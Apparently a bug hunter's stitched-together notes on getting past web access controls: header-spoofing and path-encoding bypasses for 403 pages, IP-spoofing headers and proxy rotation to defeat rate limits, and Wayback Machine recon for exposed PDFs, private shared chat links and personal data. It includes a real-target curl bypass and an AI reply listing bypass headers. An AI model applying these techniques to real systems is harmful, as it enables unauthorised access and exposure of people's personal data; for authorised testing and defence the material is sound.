
#_404

By: https://it4chis3c.medium.com/how-ai-helped-me-to-bypass-403-forbidden-06becd32b999

**Prompt:** “Give me a list of headers to bypass 403 Forbidden responses. Target is using Cloudflare and Nginx.”

**Response:**

```http
X-Forwarded-For: 127.0.0.1  or Forwarded: for=127.0.0.1 
X-Originating-IP: 127.0.0.1  or X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Remote-IP: 127.0.0.1  
X-Client-IP: 127.0.0.1  
X-Host: target.com  or X-Host: internal
X-Original-URL: /api/admin-panel/config
```

> _**Some more Examples:**_ _`User-Agent: Googlebot`_ _`User-Agent: curl/7.64.1`_ _`User-Agent: InternalScanner/1.0`_

#### **1. Find 403 Pages on Common Paths (Admin Panels, APIs, etc.)**

```bash
header="403" && (title="Forbidden" || title="Access Denied") && (body="/admin" || body="/api" || body="/wp-admin")
```

#### **2. Find 403 Pages with Potential Misconfigurations**


```bash
header="403" && (server="nginx" || server="apache") && (body="index of" || body="directory listing denied")
```

_(Looks for 403s that might reveal directory listing attempts.)_

### 1. 🛣️ Path Obfuscation & Normalization Confusion

Servers and apps parse paths differently. You can often "trick" the routing layer by slightly modifying the URL.

```
/admin
/admin/
/admin/.
/admin/..;/
/%2e/admin
/admin%2f
/admin;/
/admin?
/admin#
/ADMIN
/Admin
/admin%2F
/%2e/admin
/%252e/admin
/admin%00
etc...
```

Use this in Burp Repeater or `curl`:

```bash
curl -X GET https://target.com/admin? -H "X-Forwarded-For: 127.0.0.1"
```

Use ffuf with AI-generated headers:

```bash
ffuf -w ai_headers.txt -u http://target.com/admin -H "FUZZ" -mc 200
```

- **Ask DeepSeek to automate this.

### HackerOne Example Report

This request shows normal behavior `curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' $'https://account.mackeeper.com/admin/login'` and returns 403

Here you can see how we can bypass these restrictions `curl -i -s -k -X $'GET' -H $'Host: account.mackeeper.com' -H $'X-rewrite-url: admin/login' $'https://account.mackeeper.com/'` and return login page

Try:

- Modifying `User-Agent`: pretend to be `curl`, `Googlebot`, or `AWS-HealthChecker`
- Reordering headers
- Injecting null bytes (`%00`)
- Appending `#fragment`

#### Mimic internal traffic (e.g., `X-Forwarded-For: 169.254.169.254` for AWS metadata service).

#### Exploit framework-specific weaknesses (e.g., `X-HTTP-Method-Override` in Laravel).

#### Path Normalization Bypass via AI-Generated Payloads

Servers might misprocess encoded paths or alternate URL formats.

**AI’s Role**:

Predict effective path encodings (e.g., `%2e%2e/` instead of `../`) using datasets of WAF bypasses.

#### Manual encoding (e.g., `../` → `%2e%2e%2f`) is predictable. AI identifies **WAF-blind spots** by:

#### Testing multi-layer encoding (e.g., `%252e%252e%252f` for double-encoded `../`).

#### Leveraging rare Unicode characters (e.g., `％００` for null-byte injections).

## Practical Example:

```bash
/admin => /%2561dmin  # Double URL-encoded "a"    
/admin => /%2f%2fadmin  # URL-encoded "//"    
/admin => /;admin  # Path parameter injection  

# Test path variations with curl  
curl --path-as-is http://target.com/secret/%2e%2e%2fadmin
```

## HTTP Method Overriding with AI Analysis

Some endpoints allow `POST` but block `GET`, or vice versa. Override methods using headers like `X-HTTP-Method-Override`.

**AI’s Role**:

Identify which methods (e.g., `GET`, `POST`, `DEBUG`) are likely allowed based on server response patterns.

Most testers only try `GET/POST`. AI cross-references **API documentation** and **CVE databases** to find:

```bash
# Forgotten methods (e.g., `DEBUG`, `PURGE`).

# Framework-specific overrides (e.g., `_method=GET` in PHP).

## Practical Example:

# Send a POST request disguised as GET  
curl -X POST -H "X-HTTP-Method-Override: GET" http://target.com/restricted

```

## Bypassing IP Restrictions with AI-Generated Proxies

_Servers might block your IP but trust traffic from cloud providers (AWS, Google).

**AI’s Role**:

Scrape and test proxies from networks often **whitelisted by WAFs (e.g., AWS IP ranges).**

**Step 1**: Train an AI model to monitor and parse cloud provider IP lists (AWS, GCP, Azure) from:

### Official sources: [AWS IP Ranges](https://ip-ranges.amazonaws.com/ip-ranges.json)

Or **Leaked WAF configurations (GitHub, Pastebin).**

**Step 2**: Use AI to filter for **high-value IPs** like:

**Metadata service IPs** (`169.254.169.254` for AWS).

 **Load balancer IPs** (e.g., `34.x.x.x` for Google Cloud).

## Practical Example:

```bash
# Route requests through AWS using a proxy list  
ffuf -w ai_proxies.txt -u http://target.com -x http://FUZZ:8080 -mc 200
```

## Real World Report Example:

While doing Recon I spotted something juicy…

> `https://admin.target.com`

I hit `/admin` into the endpoint and boom.

### 403 Forbidden The Wall

 some web servers — especially when behind **reverse proxies** like **NGINX or HAProxy** — sometimes **trust specific HTTP headers** to identify internal users or requests.

So, I began playing with some common **bypass headers** in Burp Suite.

### I sent this:

```http
GET /admin HTTP/1.1
Host: admin.target.com
X-Original-URL: /admin
```

### And got back:

```http
HTTP/1.1 200 OK
Content-Type: text/html
<title>Admin Dashboard</title>
```

That's it. That's the hack.

One line:

```http
X-Original-URL: /admin
```

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 
# **How to Bypass Rate Limiting?**

Rate Limit protections can be bypassed by putting following headers in the request:

```http
X-Forwarded-For:127.0.0.1

X-Forwarded:127.0.0.1

Forwarded-For:127.0.0.1

Forwarded:127.0.0.1

X-Forwarded-Host:127.0.0.1

X-remote-IP:127.0.0.1

X-remote-addr:127.0.0.1

True-Client-IP:127.0.0.1

X-Client-IP:127.0.0.1

Client-IP:127.0.0.1

X-Real-IP:127.0.0.1

Ali-CDN-Real-IP:127.0.0.1

Cdn-Src-Ip:127.0.0.1

Cdn-Real-Ip:127.0.0.1

CF-Connecting-IP:127.0.0.1

X-Cluster-Client-IP:127.0.0.1

WL-Proxy-Client-IP:127.0.0.1

Proxy-Client-IP:127.0.0.1

Fastly-Client-Ip:127.0.0.1

True-Client-Ip:127.0.0.1
```

You can use **FakeIp** to get these headers easily in your requests.

**Source**: [https://github.com/TheKingOfDuck/burpFakeIP](https://github.com/TheKingOfDuck/burpFakeIP)

**Steps To Install:**

1. Go to site.
2. Open fakeip.py
3. Copy the whole file and save it as a python file in your system.
4. Go to Burpsuite > Extender >Extensions > Add

Select extension type as Python

Select the file we saved as extension file

### **In the case you got error while trying rate limiting follow the following steps:**

● Go to VPN and change the IP (This is because your IP might be blocked and will not work)

● Again Capture the same request and send it to the intruder.

● In positions Payload do right click and add the fakeip payloads and then start attack.

● Now if you are not getting rate limited then it is vulnerable.


1. **Custom Python Scripts**:

- **Example**:
- `import requests proxies = [ {'http': 'http://proxy1.example.com:8080'}, {'http': 'http://proxy2.example.com:8080'}, {'http': 'http://proxy3.example.com:8080'} ] url = 'https://example.com/api/endpoint' for i, proxy in enumerate(proxies): try: response = requests.get(url, proxies=proxy) print(f"Request {i + 1} with proxy {proxy['http']}: {response.status_code}") except requests.exceptions.RequestException as e: print(f"Error with proxy {proxy['http']}: {e}")` # Bypasses rate limiting?



----

### 403 bypasses:

for example, if you want to access to:

```
http://.../secure/admin
```

You may want to add a "/./" in the middle: or  add two dots instead of one: ".."

![[Pasted image 20241211001448.png]]

Another thing you can do with 403 bypass is by adding(or replacing) the last letter of the url like: 

> http://../hidden/

You can replace  the "n" (character) in the url,  but in the URL encoded form:


![[Pasted image 20241211002600.png]]

	if it dosen't work with one layer of encoding, try with double encoding "%256E"

![[Pasted image 20241211002305.png]]

Try gaining access to the admin panel:
![[Pasted image 20241211003342.png]]


---


https://www.youtube.com/embed/qWj6vQO1i0o 403 Forbidden 🚫  Fuzzing Leads To WordPress Configuration Files Exposure P1 - Bug Bounty



by lostsec 403 bypass:

https://youtu.be/wU9RSCHpQWg

# PII Leakage:

## 404 Bypass:

## URO installation:

```
https://github.com/s0md3v/uro

-> pipx install uro

```

## Steps:

```bash

WEB ARCHIVE LINK
https://web.archive.org/cdx/search/cdx?url=*.cloud.gov/*&collapse=urlkey&output=text&fl=original

ONELINER
curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.cloud.gov/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

Show Files with Listed Extensions
cat out.txt | uro | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar|\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.config|\.csv|\.yaml|\.md|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'

Access URL. If 404, copy the URL and search in Internet Archive
```


```bash
FIND SUBS
subfinder -d domain.com -all -recursive > subs_domain.com.txt

FIND PORTS ON SUBDOMAINS
cat subs_domain.com.txt | httpx -silent -ports 80,443,3000,8080,8000,8081,8008,8888,8443,9000,9001,9090 | tee -a alive_subs_port.txt

FILTER LIVE SUBDOMAINS
cat subs_domain.com.txt | httpx -td -title -sc -ip > httpx_domain.com.txt
cat httpx_domain.com.txt | awk '{print $1}' > live_subs_domain.com.txt
cat live_subs_domain.com.txt | grep -i php
cat live_subs_domain.com.txt | grep -i asp
cat live_subs_domain.com.txt | grep -i apache  

FIND PARAMETERS IN TARGET SITE
paramspider -d jp.redacted.com -s  (to list all possible parameters in the terminal)

FIND ARCHIVED URLS
waymore -i domain.com -mode U -oU waymore_domain.com.txt
waybackurls domain.com > wayback_domain.com.txt (run if waymore doesn't work properly)

FUZZ HIDDEN DATABASE FILES
dirsearch -u https://sub2.sub1.domain.com -x 403,404,500,400,502,503,429 -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -w /path/to/wordlists/database.txt
```
# Recon with this:

![[Pasted image 20250118113019.png]]

			Just replace the target domain

![[Pasted image 20250118113118.png]]_Now search for sensitive filename in the output:_

![[Pasted image 20250118113220.png]]


Now by accessing the URLs if you find something like this:

![[Pasted image 20250118113519.png]]

			404 NOT FOUND

**Then try to use Wayback machine to retrieve .zip files: **

![[Pasted image 20250118113758.png]]



Steps to Reproduce:
2.  Use waybackurls to extract URLs from the target site.
3.  Identify URLs for .zip, .pdf, or .xls files.
4.  Attempt to access the files through their direct URLs in a browser or using a tool like curl. Observe the 404 Not Found error.
5.  Navigate to Web Archive.
6.  Enter the inaccessible URL in the search bar.
7.  Select an older snapshot of the URL.
8.  Download the file successfully from the archive.

![[Pasted image 20250118113631.png]]

			After selecting the old snapshot see if you're able to download files

Direct URLs return a 404 Not Found error, but files are retrievable from older snapshots in the Web Archive.
Impact:
Users are unable to access potentially critical resources through their original URLs. This could lead to user frustration, loss of trust, and inefficiency in retrieving historical data.


Attachments:
•  Example URLs showing the issue.
•  Screenshots of the 404 error.
•  Screenshots of successful downloads from Web Archive.
Please address this issue to improve user experience and ensure data accessibility.


---



----
##  Find sensitive data in PDF files

#Exposed_PDFs 

the methodology is the same of the above, just do:  "grep pdf" or "grep share" to find chatgpt private chats:

![[Pasted image 20250125113627.png]]


![[Pasted image 20250125113217.png]]

		Private chatgpt users search results by the waybackmachine

check for specific file types:

like ".doc" or ".pp" etc:

![[Pasted image 20250125113710.png]]

and see if you can download them by the link or you can access them.


P.S: with these commands you can check for vulnerability disclosure much faster.


The last one searchs for sensitive words on pdf files:

![[Pasted image 20250125115139.png]]

**Bonus: ** Test webarchive on robot.txt file to see more endpoints:

![[Pasted image 20250125115602.png]]

**Bonus 2:** if you find a "404 Not Found" try to use wayback machine exstension to fetch data:

![[Pasted image 20250125185227.png]]

![[Pasted image 20250125185303.png]]

----

# **Step-by-Step: Finding the Goldmine**

> **Extracting URLs** I used WaybackUrls to extract all the URLs from the target domain.
> 
> [https://web.archive.org/cdx/search/cdx?url=*.domain.com/*&collapse=urlkey&output=text&fl=original](https://web.archive.org/cdx/search/cdx?url=*.policybazaar.com%2F*&collapse=urlkey&output=text&fl=original)
> 
> **Spotting .PDF Files** Among the extracted URLs, I noticed some that ended with `.pdf`.
> 
> **Checking Accessibility** I tried opening these URLs, but most of them showed a 404 error.
> 
> **Using Archive.org** I then pasted these URLs into [archive.org](https://archive.org) to check older snapshots.

![](https://miro.medium.com/v2/resize:fit:700/1*f2EBArBB-2qoue2BSvSWoA.png)

![](https://miro.medium.com/v2/resize:fit:700/1*1-RJL7QP6raTF2rgEwyInA.png)

> **Discovering the Leak** By accessing these snapshots, I found PDFs containing sensitive user data such as phone numbers, email addresses, names, addresses, transaction IDs, and more. The scale of the leak was massive.

![](https://miro.medium.com/v2/resize:fit:700/1*-FeAtOhazdWjc0Hl2JGerw.png)

# Got Awarded 500$ for this finding

![](https://miro.medium.com/v2/resize:fit:700/1*T7RBgfwpZugqUmYlPE_32g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*1DzQMVuT4mXcpCGThTSQvQ.png)



----